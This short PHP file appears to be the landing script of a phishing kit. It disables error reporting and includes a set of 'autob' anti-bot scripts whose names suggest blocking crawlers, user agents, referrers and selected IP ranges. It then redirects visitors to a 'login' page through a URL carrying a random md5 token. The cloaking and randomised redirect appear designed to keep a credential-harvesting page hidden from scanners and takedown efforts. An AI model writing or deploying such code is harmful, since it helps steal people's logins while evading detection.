<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
$ib = $_SERVER['REMOTE_ADDR'];
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
echo '<!DOCTYPE html>
<html>
<head>
<script>setTimeout(function(){window.location.href="'.$d.'/login?'.$ran.'='.md5(uniqid().$ran).'";});</script>
</head></html>';
?>